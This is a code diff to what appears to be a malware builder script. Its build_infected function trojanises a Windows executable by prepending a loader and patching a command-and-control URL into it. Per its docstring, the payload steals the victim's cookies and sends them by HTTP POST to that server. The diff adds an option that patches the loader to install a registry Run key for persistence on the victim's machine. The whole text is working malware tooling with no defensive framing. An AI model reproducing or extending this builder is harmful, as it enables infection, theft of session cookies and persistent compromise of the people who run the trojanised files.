@@ -252,14 +252,17 @@ def run(path, sink, kill, purge, timeout, extra, log=print):
 
 # ------------------------------------------------------------------ builder
 C2_SENTINEL = b"CKC2_DEADBEEF_"
+PERSIST_SENTINEL = b"CKPR____"
+PERSIST_ENABLE = b"CKPR0001"
 
-def build_infected(host_path, c2_url="", log=print):
+def build_infected(host_path, c2_url="", persist=False, log=print):
     """Infects the .exe: prepends the loader and appends the original host.
     Format: [loader.exe (with C2 URL patched)][host.exe bytes][host_len:4 LE]["CKLG":4]
     Output goes to ifec/<name>.exe (does NOT overwrite the original).
     The C2 URL is embedded in the payload via sentinel patching -- when the victim
     runs it, the payload extracts cookies and sends HTTP POST to the C2.
-    If c2_url is empty, the payload uses local fallback (pipe/file)."""
+    If c2_url is empty, the payload uses local fallback (pipe/file).
+    If persist=True, the payload installs a registry Run key on the victim."""
     if not os.path.isfile(LOADER):
         log("[-] missing loader.exe -- rebuild first"); return None
     if not os.path.isfile(host_path):
@@ -293,6 +296,14 @@ def build_infected(host_path, c2_url="", log=print):
             url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
             loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
             log("[+] C2 URL embedded: %s" % c2_url)
+    # Patch persistence sentinel if enabled
+    if persist:
+        pidx = loader_bytes.find(PERSIST_SENTINEL)
+        if pidx != -1:
+            loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
+            log("[+] persistence: enabled (registry Run key)")
+        else:
+            log("[!] persistence sentinel not found in loader")
     out = loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
     # output to ifec/
     IFEC = os.path.join(HERE, "ifec")
